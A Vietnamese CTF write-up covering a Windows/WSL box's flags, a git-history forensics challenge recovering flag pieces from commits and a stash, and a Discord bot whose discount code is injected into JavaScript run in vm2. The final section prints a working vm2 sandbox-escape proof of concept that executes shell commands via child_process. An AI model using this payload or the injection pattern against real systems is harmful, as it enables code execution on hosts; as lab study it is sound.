drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
-rwxrwxrwx 1 root root  76 Apr 30 11:03 copy_flag.bat
-rwxrwxrwx 1 root root  74 Apr 26 12:39 startup.bat

$ sudo cat /mnt/temp/Users/Administrator/tasks/startup.bat
@echo off
wsl sudo service nginx start
wsl sudo service php7.4-fpm start
$ sudo ls -la /mnt/temp/Users/Administrator/
total 1584
drwxrwxrwx 1 root root    512 Apr 10 11:55 .
drwxrwxrwx 1 root root    512 Apr 30 09:31 ..
drwxrwxrwx 1 root root    512 Nov 29  2022 3D Objects
drwxrwxrwx 1 root root    512 Apr 29  2020 AppData
lrwxrwxrwx 1 root root     45 Apr 29  2020 Application Data
drwxrwxrwx 1 root root    512 Nov 29  2022 Contacts
lrwxrwxrwx 1 root root     73 Apr 29  2020 Cookies
drwxrwxrwx 1 root root    512 Apr 27 11:38 Desktop
drwxrwxrwx 1 root root    512 Nov 29  2022 Documents
drwxrwxrwx 1 root root    512 Nov 29  2022 Downloads
drwxrwxrwx 1 root root    512 Nov 29  2022 Favorites
drwxrwxrwx 1 root root    512 Nov 29  2022 Links
lrwxrwxrwx 1 root root     43 Apr 29  2020 Local Settings
drwxrwxrwx 1 root root    512 Nov 29  2022 Music
lrwxrwxrwx 1 root root     39 Apr 29  2020 My Documents
-rwxrwxrwx 1 root root 262144 Apr 30 14:08 NTUSER.DAT
-rwxrwxrwx 1 root root  65536 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TM.blf
-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000002.regtrans-ms
lrwxrwxrwx 1 root root     81 Apr 29  2020 NetHood
drwxrwxrwx 1 root root    512 Nov 29  2022 Pictures
lrwxrwxrwx 1 root root     70 Apr 29  2020 Recent
drwxrwxrwx 1 root root    512 Nov 29  2022 Saved Games
drwxrwxrwx 1 root root    512 Nov 29  2022 Searches
lrwxrwxrwx 1 root root     70 Apr 29  2020 SendTo
lrwxrwxrwx 1 root root     74 Apr 29  2020 Start Menu
lrwxrwxrwx 1 root root     73 Apr 29  2020 Templates
drwxrwxrwx 1 root root    512 Nov 29  2022 Videos
-rwxrwxrwx 1 root root 143360 Apr 29  2020 ntuser.dat.LOG1
-rwxrwxrwx 1 root root  99328 Apr 29  2020 ntuser.dat.LOG2
-rwxrwxrwx 1 root root     20 Apr 29  2020 ntuser.ini
drwxrwxrwx 1 root root    512 Apr 30 09:40 tasks
$ sudo ls -la /mnt/temp/Users/Administrator/Desktop/

total 0
drwxrwxrwx 1 root root 512 Apr 27 11:38 .
drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
-rwxrwxrwx 1 root root 282 Nov 29  2022 desktop.ini
-rwxrwxrwx 1 root root  25 Apr 27 11:38 root.txt

$ sudo cat /mnt/temp/Users/Administrator/Desktop/root.txt

HTB{Pwn1ng_WsL_4_7h3_W1n}
$
````

user flag : `HTB{SpIP_Abu53_4_RC3}`
root flag : `HTB{Pwn1ng_WsL_4_7h3_W1n}`

## Misc/Zephyr

- Đây là 1 bài skill git với source rust program + sqlite database.
- Đề bài tải xuống .git + 2 file mình nêu ở trên.
- Như yêu cầu là flag sẽ gồm 3 phần.

- Nhìn sơ qua thì ta có thể check được mã nguồn có 2 branch là `main` và `w4rri0r-changes` 

![image](https://hackmd.io/_uploads/BJ6jmGTXA.png)

- Đầu tiên mình sẽ check xem có bao nhiêu commit ở từng nhánh

### Nhánh main

````
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git log -p
commit 1501091a639e565d40a2b3b20df3227e86d72a0e (HEAD -> main)
Author: w4rri0r <w4rri0r@zephyr.com>
Date:   Fri May 10 21:02:33 2024 +0100

    Removed Sensitive Info...

diff --git a/database.db b/database.db
index 6a3a58e..8dab4e5 100644
Binary files a/database.db and b/database.db differ

commit ae4f456dcfe1e989ce13ca25231ac5df2fc4380d
Author: w4rri0r <w4rri0r@zephyr.com>
Date:   Fri May 10 21:00:57 2024 +0100

    Initial Commit

diff --git a/database.db b/database.db
new file mode 100644
index 0000000..6a3a58e
Binary files /dev/null and b/database.db differ
diff --git a/source.rs b/source.rs
new file mode 100644
index 0000000..7ece558
--- /dev/null
+++ b/source.rs
@@ -0,0 +1,125 @@
+#[macro_use] extern crate lazy_static;
+use std::io;
+use std::io::Write;
+use std::env;
+use std::sync::Mutex;
+use rusqlite::{Connection};
+
+
+lazy_static! {
+    static ref DB_CONN: Mutex<Connection> = Mutex::new(Connection::open("database.db").unwrap());
+}
+
+const MENU: &str = "MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit";
+
+fn main() {
+    let admin_password: String = env::var("ADMIN_PASS").expect("Admin Password not set!");
+
+    print!("Enter the administrator password: ");
+    io::stdout().flush().unwrap();
+
+    let mut input = String::new();
+    io::stdin()
+        .read_line(&mut input)
+        .expect("Failed to read password");
+
+    if input.trim() != admin_password {
+        eprintln!("Password invalid!");
+        std::process::exit(-1);
+    }
+
+    input.clear();
+
+    println!("{}\n", MENU);
+
+    loop {
+        print!("> ");
+        io::stdout().flush().unwrap();
+
+        io::stdin()
+            .read_line(&mut input)
+            .expect("Failed to read line");
+
+        let number: i32 = input.trim().parse().unwrap_or_else(|_| {
+            eprintln!("Please enter a valid integer!");
+            return 5;
+        });
+
+        match number {
+            1 => add_user(),
+            2 => view_users(),
+            3 => delete_user(),
+            4 => break,
+            _ => println!("Invalid choice, please try again!")
+        }
+    }
+}
+
+fn add_user() {
+    print!("Username: ");
+    io::stdout().flush().unwrap();
+
+    let mut username = String::new();
+
+    io::stdin()
+        .read_line(&mut username)
+        .expect("Failed to read line");
+
+    let username = username.trim();
+
+    print!("Password: ");
+    io::stdout().flush().unwrap();
+
+    let mut password = String::new();
+
+    io::stdin()
+        .read_line(&mut password)
+        .expect("Failed to read line");
+
+    let password = password.trim();
+
+    let conn = DB_CONN.lock().unwrap();
+
+    conn.execute("INSERT INTO users (username, password) VALUES (?1, ?2);", &[&username, &password])
+        .expect("Failed to create user!");
+}
+
+fn view_users() {
+    let conn = DB_CONN.lock().unwrap();
+    let mut stmt = conn.prepare("SELECT id, username, password FROM users;")
+        .expect("Failed to prepare a statement");
+    let mut rows = stmt.query([])
+        .expect("Error getting users");
+
+    while let Ok(Some(row)) = rows.next() {
+        let id: i32 = row.get::<_, i32>(0).expect("Parsing ID failed!");
+        let username: String = row.get::<_, String>(1).expect("Parsing username failed!");
+        let password: String = row.get::<_, String>(2).expect("Parsing password failed!");
+
+        println!("ID {}: {}\t{}", id, username, password);
+    };
+}
+
+fn delete_user() {
+    let conn = DB_CONN.lock().unwrap();
+
+    print!("Enter ID: ");
+    io::stdout().flush().unwrap();
+
+    let mut input = String::new();
+    io::stdin()
+        .read_line(&mut input)
+        .expect("Failed to read line");
+
+    let number: i32 = match input.trim().parse() {
+        Ok(num) => num,
+        Err(_) => {
+            eprintln!("Please enter a valid integer!");
+            return;
+        }
+    };
+
+    conn.execute("DELETE FROM users WHERE id=?1;", &[&number])
+        .expect("Failed to delete user!");
+}
+
(END
````
- Nhìn vào kết quả hiển thị có thể thấy server có 2 commit được author `w4rri0r` commit đó là

+ commit ae4f456dcfe1e989ce13ca25231ac5df2fc4380d -> commit initialCommit đây là commit đầu tiên push dự án lên git

+ commit 1501091a639e565d40a2b3b20df3227e86d72a0e (HEAD -> main) -> commit message Removed Sensitive Info... -> quan sát kĩ có thể thấy là author đã thay đổi một số thông tin trong file `database.db`

- View qua file `database.db` hiện tại thì thấy có một bảng users chứa `CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT`

- Dùng tool view .db online của SQLite database thì không thấy có bất kì dữ liệu nào nằm ở trong bảng lúc này.


- Có thể vào thẳng trực tiếp .git để xem các file configuration và trạng thái của repo

````
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ cd ../
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git$ ls
COMMIT_EDITMSG  config  description  FETCH_HEAD  HEAD  hooks  index  info  logs  objects  ORIG_HEAD  refs
````

- Trở lại với flow ở trên thì lúc này mình sẽ redo lại các commit trước
````
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git checkout HEAD~0 -- .
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat database.db 
>�>P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)n�;tableusersusersCREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, pass��rd TEXusersl3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ 
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git checkout HEAD~1 -- .
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat database.db 
>�>P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)n�;tableusersusersCREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, pass��%adminusersl3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ S

````
- Có thể thấy lúc này database.db có thêm một bản ghi trong table users `adminusers`

- Dùng tool view online thì thấy được password của admin là 1 phần đầu của flag.

- Mình đã check xem trong file source.rs có phần nào của flag không thì không thấy.

````
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat source.rs | grep "}"
use rusqlite::{Connection};
}
    }
    println!("{}\n", MENU);
        });
        }
    }
}
}
        println!("ID {}: {}\t{}", id, username, password);
    };
}
        }
    };
}
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat source.rs
#[macro_use] extern crate lazy_static;
use std::io;
use std::io::Write;
use std::env;
use std::sync::Mutex;
use rusqlite::{Connection};


lazy_static! {
    static ref DB_CONN: Mutex<Connection> = Mutex::new(Connection::open("database.db").unwrap());
}

const MENU: &str = "MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit";

fn main() {
    let admin_password: String = env::var("ADMIN_PASS").expect("Admin Password not set!");

    print!("Enter the administrator password: ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read password");

    if input.trim() != admin_password {
        eprintln!("Password invalid!");
        std::process::exit(-1);
    }

    input.clear();

    println!("{}\n", MENU);

    loop {
        print!("> ");
        io::stdout().flush().unwrap();

        io::stdin()
            .read_line(&mut input)
            .expect("Failed to read line");

        let number: i32 = input.trim().parse().unwrap_or_else(|_| {
            eprintln!("Please enter a valid integer!");
            return 5;
        });

        match number {
            1 => add_user(),
            2 => view_users(),
            3 => delete_user(),
            4 => break,
            _ => println!("Invalid choice, please try again!")
        }
    }
}

fn add_user() {
    print!("Username: ");
    io::stdout().flush().unwrap();

    let mut username = String::new();

    io::stdin()
        .read_line(&mut username)
        .expect("Failed to read line");

    let username = username.trim();

    print!("Password: ");
    io::stdout().flush().unwrap();

    let mut password = String::new();

    io::stdin()
        .read_line(&mut password)
        .expect("Failed to read line");

    let password = password.trim();

    let conn = DB_CONN.lock().unwrap();

    conn.execute("INSERT INTO users (username, password) VALUES (?1, ?2);", &[&username, &password])
        .expect("Failed to create user!");
}

fn view_users() {
    let conn = DB_CONN.lock().unwrap();
    let mut stmt = conn.prepare("SELECT id, username, password FROM users;")
        .expect("Failed to prepare a statement");
    let mut rows = stmt.query([])
        .expect("Error getting users");

    while let Ok(Some(row)) = rows.next() {
        let id: i32 = row.get::<_, i32>(0).expect("Parsing ID failed!");
        let username: String = row.get::<_, String>(1).expect("Parsing username failed!");
        let password: String = row.get::<_, String>(2).expect("Parsing password failed!");

        println!("ID {}: {}\t{}", id, username, password);
    };
}

fn delete_user() {
    let conn = DB_CONN.lock().unwrap();

    print!("Enter ID: ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read line");

    let number: i32 = match input.trim().parse() {
        Ok(num) => num,
        Err(_) => {
            eprintln!("Please enter a valid integer!");
            return;
        }
    };

    conn.execute("DELETE FROM users WHERE id=?1;", &[&number])
        .expect("Failed to delete user!");
}
````

Flag2: `_gOT_thE_DB_`


### Nhánh w4rri0r-changes

- Tiếp tục switch qua branch w4rri0r-changes, đầu tiên ta sẽ xem những commit tương tự như ở nhánh `main`

````
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git log -p
commit bfa416eaeaff63de8f5118be829f669ffd0cc6a7 (HEAD -> w4rri0r-changes)
Author: w4rri0r <w4rri0r@zephyr.com>
Date:   Fri May 10 21:07:44 2024 +0100

    Changed output formatting

diff --git a/source.rs b/source.rs
index 7ece558..431b213 100644
--- a/source.rs
+++ b/source.rs
@@ -13,7 +13,9 @@ lazy_static! {
 const MENU: &str = "MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit";
 
 fn main() {
-    let admin_password: String = env::var("ADMIN_PASS").expect("Admin Password not set!");
+    // let admin_password: String = env::var("ADMIN_PASS").expect("Admin Password not set!");
+    // hardcode for testing
+    let admin_password: &str = "HTB{g0t_tH3_p4s5";
 
     print!("Enter the administrator password: ");
     io::stdout().flush().unwrap();
@@ -96,7 +98,7 @@ fn view_users() {
         let username: String = row.get::<_, String>(1).expect("Parsing username failed!");
         let password: String = row.get::<_, String>(2).expect("Parsing password failed!");
 
-        println!("ID {}: {}\t{}", id, username, password);
+        println!("ID: {}\nUsername: {}\nPassword: {}", id, username, password);
     };
 }
 

commit 1501091a639e565d40a2b3b20df3227e86d72a0e (main)
Author: w4rri0r <w4rri0r@zephyr.com>
Date:   Fri May 10 21:02:33 2024 +0100

    Removed Sensitive Info...

diff --git a/database.db b/database.db
index 6a3a58e..8dab4e5 100644
Binary files a/database.db and b/database.db differ

commit ae4f456dcfe1e989ce13ca25231ac5df2fc4380d
Author: w4rri0r <w4rri0r@zephyr.com>
Date:   Fri May 10 21:00:57 2024 +0100

    Initial Commit

diff --git a/database.db b/database.db
new file mode 100644
index 0000000..6a3a58e
Binary files /dev/null and b/database.db differ
diff --git a/source.rs b/source.rs
new file mode 100644
index 0000000..7ece558
--- /dev/null
+++ b/source.rs
@@ -0,0 +1,125 @@
+#[macro_use] extern crate lazy_static;
+use std::io;
+use std::io::Write;
+use std::env;
+use std::sync::Mutex;
+use rusqlite::{Connection};
+
+
+lazy_static! {
+    static ref DB_CONN: Mutex<Connection> = Mutex::new(Connection::open("database.db").unwrap());
+}
+
+const MENU: &str = "MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit";
+
+fn main() {
+    let admin_password: String = env::var("ADMIN_PASS").expect("Admin Password not set!");
+
+    print!("Enter the administrator password: ");
+    io::stdout().flush().unwrap();
+
+    let mut input = String::new();
+    io::stdin()
+        .read_line(&mut input)
+        .expect("Failed to read password");
+
+    if input.trim() != admin_password {
+        eprintln!("Password invalid!");
+        std::process::exit(-1);
+    }
+
+    input.clear();
+
+    println!("{}\n", MENU);
+
+    loop {
+        print!("> ");
+        io::stdout().flush().unwrap();
+
+        io::stdin()
+            .read_line(&mut input)
+            .expect("Failed to read line");
+
+        let number: i32 = input.trim().parse().unwrap_or_else(|_| {
+            eprintln!("Please enter a valid integer!");
+            return 5;
+        });
+
+        match number {
+            1 => add_user(),
+            2 => view_users(),
+            3 => delete_user(),
+            4 => break,
+            _ => println!("Invalid choice, please try again!")
+        }
+    }
+}
+
+fn add_user() {
+    print!("Username: ");
+    io::stdout().flush().unwrap();
+
+    let mut username = String::new();
+
+    io::stdin()
+        .read_line(&mut username)
+        .expect("Failed to read line");
+
+    let username = username.trim();
+
+    print!("Password: ");
+    io::stdout().flush().unwrap();
+
+    let mut password = String::new();
+
+    io::stdin()
+        .read_line(&mut password)
+        .expect("Failed to read line");
+
+    let password = password.trim();
+
+    let conn = DB_CONN.lock().unwrap();
+
+    conn.execute("INSERT INTO users (username, password) VALUES (?1, ?2);", &[&username, &password])
+        .expect("Failed to create user!");
+}
+
+fn view_users() {
+    let conn = DB_CONN.lock().unwrap();
+    let mut stmt = conn.prepare("SELECT id, username, password FROM users;")
+        .expect("Failed to prepare a statement");
+    let mut rows = stmt.query([])
+        .expect("Error getting users");
+
+    while let Ok(Some(row)) = rows.next() {
+        let id: i32 = row.get::<_, i32>(0).expect("Parsing ID failed!");
+        let username: String = row.get::<_, String>(1).expect("Parsing username failed!");
+        let password: String = row.get::<_, String>(2).expect("Parsing password failed!");
+
+        println!("ID {}: {}\t{}", id, username, password);
+    };
+}
+
+fn delete_user() {
+    let conn = DB_CONN.lock().unwrap();
+
+    print!("Enter ID: ");
+    io::stdout().flush().unwrap();
+
+    let mut input = String::new();
+    io::stdin()
+        .read_line(&mut input)
+        .expect("Failed to read line");
+
+    let number: i32 = match input.trim().parse() {
+        Ok(num) => num,
+        Err(_) => {
+            eprintln!("Please enter a valid integer!");
+            return;
+        }
+    };
+
+    conn.execute("DELETE FROM users WHERE id=?1;", &[&number])
+        .expect("Failed to delete user!");
+}
+

````

- Có thể thấy ở nhánh này có 3 commits

+ commit bfa416eaeaff63de8f5118be829f669ffd0cc6a7 (HEAD -> w4rri0r-changes) -> commit message `Changed output formatting` và mình thấy author đã xóa admin_password : `HTB{g0t_tH3_p4s5` và đây là phần 1 của flag.

+ Còn các commit còn lại chỉ là pull từ nhánh main sang commit initialCommit và không có nội dung gì quan trọng.

Flag1: `HTB{g0t_tH3_p4s5`


### Flag3 - Stash

- Sau một hồi switching giữa các nhánh thì mình vô tình đọc được 1 nội dung quan trọng mà đáng lẽ ra mình nên nhớ vì từng làm dự án nhiều mem thì bắt buộc phải biết điều này :/

````
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git$ cd refs/
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ ls
heads  stash  tags
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ cat stash 
a38932590c3265c1c2e0160a70e449ecfb39d3e2
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ S

````

- Mình thấy có một stash ở đây, thì hiểu nôm na là nếu dự án có nhiều người code thì để 1 người sẽ có 1 branch riêng mà sau khi pull từ main về sẽ gỡ conflict khi code vì có thể sẽ có 2 hay nhiều người cùng sửa chúng 1 đoạn code và code của họ có thể sẽ khác nhau -> sau khi sửa xong sẽ merge từ nhánh sang main và main sẽ là source hoàn thiện nhất.

- Có nhiều cách có thể stash được đoạn code được giấu trên đây thì có thể dùng vs code hoặc dùng  git command cũng được

````
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git stash pop
Auto-merging source.rs
On branch w4rri0r-changes
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
	modified:   database.db

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	modified:   source.rs

Dropped refs/stash@{0} (a38932590c3265c1c2e0160a70e449ecfb39d3e2)
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ ls
database.db  source.rs
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat source.rs | grep "}"
use rusqlite::{Connection};
}
    }
    println!("Code: g0T_TH3_sT4sH}");
    println!("{}\n", MENU);
        });
        }
    }
}
}
        println!("ID: {}\nUsername: {}\nPassword: {}", id, username, password);
    };
}
        }
    };
}
l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ 


````

Flag3 : `g0T_TH3_sT4sH}`

Hoặc dùng vs code :
![image](https://hackmd.io/_uploads/HJ4YmM6m0.png)

Flag: `HTB{g0t_tH3_p4s5_gOT_thE_DB_g0T_TH3_sT4sH}`

## Web/Magicom

- Tiếp tục là một bài white-box source php một bài web mà mấy anh trong clb `thao thức không ngủ` vì nó:>


## misc/Super-Duper Pwn

- Một bài misc mà đúng ra là nó là web white-box, nhờ có bài này mà mình hiểu khá rõ cách để tạo 1 con bot trong discord:>

- Oke, view qua source ta thấy chall có 2 phần chính code với nodejs:
1. con bot được build từ `dircord.js` của `npm`
2. node server api được con bot này kết nối.

- Ta có thể dựng local bằng cách thay token và client-id được cung cấp cho developer của discord.

### bot

````
import { Client, GatewayIntentBits, REST, Routes, EmbedBuilder } from "discord.js";
import axios from "axios";

const token = process.env.BOT_TOKEN;
const clientId = process.env.CLIENT_ID;

const evaluateCode = async (code) => {
    try {
        const response = await axios.post("http://api:3000/run", { code });
        return JSON.stringify(response.data.output);
    } catch (error) {
        return error.message;
    }
}

const getRandomPrice = () => Math.floor(Math.random() * (12 - 5 + 1)) + 5;

let products = [
    { id: "PROD001", name: "Blamco Brand Mac and Cheese", description: "A cheesy delight for those in the wasteland.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/f/fb/Fallout4_Blamco_brand_mac_and_cheese.png/540px-Fallout4_Blamco_brand_mac_and_cheese.png" },
    { id: "PROD002", name: "InstaMash", description: "Instant mashed potatoes.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/c/ce/Fallout4_InstaMash.png/540px-Fallout4_InstaMash.png" },
    { id: "PROD003", name: "Sugar Bombs", description: "Pre-war breakfast cereal.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/d/d7/Fallout4_Sugar_Bombs.png/361px-Fallout4_Sugar_Bombs.png" },
    { id: "PROD004", name: "Salisbury Steak", description: "Tasty, preserved Salisbury steak.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/0/0f/Fallout4_Salisbury_Steak.png/540px-Fallout4_Salisbury_Steak.png" },
    { id: "PROD005", name: "Potato Crisps", description: "Crispy and salty potato chips.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/a/ab/Fallout4_Potato_Crisps.png/242px-Fallout4_Potato_Crisps.png" },
    { id: "PROD006", name: "Pork n' Beans", description: "A can of beans with bits of pork.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/2/24/Fallout4_Pork_n%27_Beans.png/376px-Fallout4_Pork_n%27_Beans.png" },
    { id: "PROD007", name: "Fancy Lads Snack Cakes", description: "Pre-war snack cakes.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/5/57/Fallout4_Fancy_lads_snack_cakes.png/368px-Fallout4_Fancy_lads_snack_cakes.png" },
    { id: "PROD008", name: "Dandy Boy Apples", description: "Preserved pre-war apples.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/0/05/Fo4_Dandy_Boy_Apples.png/540px-Fo4_Dandy_Boy_Apples.png" },
    { id: "PROD009", name: "Cram", description: "Canned meat product.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/7/72/Fallout4_Cram.png/540px-Fallout4_Cram.png" },
    { id: "PROD010", name: "Canned Dog Food", description: "Dog food, but you can eat it too.", price: getRandomPrice(), image: "https://images.fallout.wiki/thumb/b/b7/Canned_dog_food.png/371px-Canned_dog_food.png" },
    { id: "PROD011", name: "Yum Yum Deviled Eggs", description: "Canned deviled eggs.", price: getRandomPrice(), image: "https://images.fallout.wiki/6/68/FO76_Yum_yum_deviled_eggs.png" },
    { id: "PROD012", name: "Purified Water", description: "Clean, safe water.", price: 10, image: "https://images.fallout.wiki/thumb/4/4d/Fo4_purified_water.png/308px-Fo4_purified_water.png" },
    { id: "PROD013", name: "Whiskey", description: "Strong alcoholic drink.", price: 8, image: "https://images.fallout.wiki/thumb/3/3d/Fo4_Whiskey.png/331px-Fo4_Whiskey.png" },
    { id: "PROD014", name: "Nuka-Cola", description: "The classic post-apocalyptic refreshment.", price: 20, image: "https://images.fallout.wiki/thumb/1/10/Fallout4_Nuka_Cola.png/300px-Fallout4_Nuka_Cola.png" },
    { id: "PROD015", name: "Nuka-Cola Quantum", description: "A special variant of Nuka-Cola that glows.", price: 100, image: "https://images.fallout.wiki/thumb/e/e6/Fallout4_Nuka_Cola_Quantum.png/300px-Fallout4_Nuka_Cola_Quantum.png" }
];

const carts = {};

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on("ready", () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

const commands = [
    {
        name: "listproducts",
        description: "Lists all available products in the vending machine"
    },
    {
        name: "addtocart",
        description: "Adds a product to your cart",
        options: [{
            name: "id",
            type: 3,
            description: "Product ID",
            required: true
        }, {
            name: "quantity",
            type: 4,
            description: "Quantity",
            required: true
        }]
    },
    {
        name: "viewcart",
        description: "View the items in your cart"
    },
    {
        name: "checkout",
        description: "Check out and calculate the total price",
        options: [{
            name: "discount",
            type: 3,
            description: "Discount code",
            required: false
        }]
    }
];

const rest = new REST({ version: "10" }).setToken(token);

(async () => {
    try {
        console.log("Started refreshing application (/) commands globally.");

        await rest.put(
            Routes.applicationCommands(clientId),
            { body: commands },
        );

        console.log("Successfully reloaded application (/) commands globally.");
    } catch (error) {
        console.error(error);
    }
})();

client.on("interactionCreate", async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === "listproducts") {
        const embeds = products.map(product => {
            return new EmbedBuilder()
                .setColor(0x0099ff)
                .setTitle(product.name)
                .setDescription(product.description)
                .addFields(
                    { name: "ID", value: product.id },
                    { name: "Price", value: `${product.price} caps` }
                )
                .setImage(product.image);
        });

        const chunks = [];
        for (let i = 0; i < embeds.length; i += 10) {
            chunks.push(embeds.slice(i, i + 10));
        }

        for (const chunk of chunks) {
            await interaction.channel.send({ embeds: chunk });
        }
        await interaction.reply({ content: "Here are the available products:", ephemeral: true });
    }

    if (commandName === "addtocart") {
        const id = interaction.options.getString("id");
        const quantity = interaction.options.getInteger("quantity");

        const product = products.find(p => p.id === id);

        if (!product) {
            await interaction.reply("Product not found.");
            return;
        }

        if (!carts[interaction.user.id]) {
            carts[interaction.user.id] = [];
        }

        carts[interaction.user.id].push({ product, quantity });

        await interaction.reply(`${quantity}x ${product.name} added to your cart.`);
    }
    if (commandName === "healthCheck") {
        await interaction.reply(`Hihi : ${interaction}`);
    }

    if (commandName === "viewcart") {
        const cart = carts[interaction.user.id] || [];
        if (cart.length === 0) {
            await interaction.reply("Your cart is empty.");
            return;
        }

        const embed = new EmbedBuilder()
            .setColor(0x0099ff)
            .setTitle("Your Cart")
            .setDescription("Here are the items in your cart:");

        cart.forEach(item => {
            embed.addFields({ name: item.product.name, value: `Quantity: ${item.quantity}, Price: ${item.product.price} caps each` });
        });

        await interaction.reply({ embeds: [embed] });
    }

    if (commandName === "checkout") {
        interaction.member.roles.cache.some(role => console.log(role.name+ "\n"));

        // if (!interaction.member.roles.cache.some(role => role.name === 'Loggedin')) {
        //     await interaction.reply("You don't have permission to use this command.");
        //     return;
        // }

        // const cart = carts[interaction.user.id] || [];
        // if (cart.length === 0) {
        //     await interaction.reply("Your cart is empty.");
        //     return;
        // }

        const discountCode = interaction.options.getString("discount");

        const definitions = `
            const discountCodes = {
                "DISCOUNT10": 0.10,
                "DISCOUNT20": 0.20,
                "DISCOUNT30": 0.30
            };
            let cart = ${JSON.stringify(cart)}; 
            let discountCode = '${discountCode}'; 
            let discount = 0;
        `;
        const code = `
            if (discountCode && discountCodes[discountCode]) {
                discount = discountCodes[discountCode];
            }
            
            let total = 0;
            cart.forEach(item => {
                total += item.product.price * item.quantity;
            });
            total *= (1 - discount);
            total;
        `;
        const output = await evaluateCode(definitions + code);

        await interaction.reply(`Your total is ${output} caps`);
        carts[interaction.user.id] = [];
    }
});

client.login(token);

````

- bot sử dụng 2 `dependencies` là `{
    "axios": "1.6.8",
    "discord.js": "14.14.1"
  }`
  
- Có 4 chức năng chính với các option khác nhau

1. `listproducts` hiển thị tất cả sản phầm nằm trong array `products `
2. `addtocart` thêm sản phẩm vào giỏ hàng với option là `id` của mặt hàng.
3. `viewcart` hiển thị tất cả các sản phẩm trong giỏ hàng của bạn.
4.  `checkout` sẽ kiểm tra `interaction.member.roles.cache` name có hợp lệ hay không -> check cart có hàng hay không -> nhận option `discount` sau đó tính toán tổng giá trị giỏ hàng và trả ra `total` 

- Để ý `checkout` thông qua hàm `evaluateCode` thực hiện call api với `axios` đển backend kèm payload `code`
```
const evaluateCode = async (code) => {
    try {
        const response = await axios.post("http://api:3000/run", { code });
        return JSON.stringify(response.data.output);
    } catch (error) {
        return error.message;
    }
}
```

-> Đây sẽ là đoạn hook ta khai thác.

### api

````
const express = require("express");
const { VM } = require("vm2");

const app = express();
const port = 3000;

app.use(express.json());

app.post("/run", (req, res) => {
    let { code } = req.body;
    
    if (typeof code !== "string") {
        return res.status(400).json({ error: "Code must be a string." });
    }

    const vm = new VM();

    try {
        let output = vm.run(code);
        console.log(output);
        res.json({ output });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(port, () => {
    console.log(`Server running on http://127.0.0.1:${port}`);
});

````
- Nhận dữ liệu thì server sử dụng vm để tạo môi trường độc lập chạy mã code.

- Searching thì mình tìm được trên exploit-db poc của `vm` đúng khít phiên bản này luôn.

````
const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
            )
        }
    }
};
p.then();
`;
````

- Tiến hành lấy shell


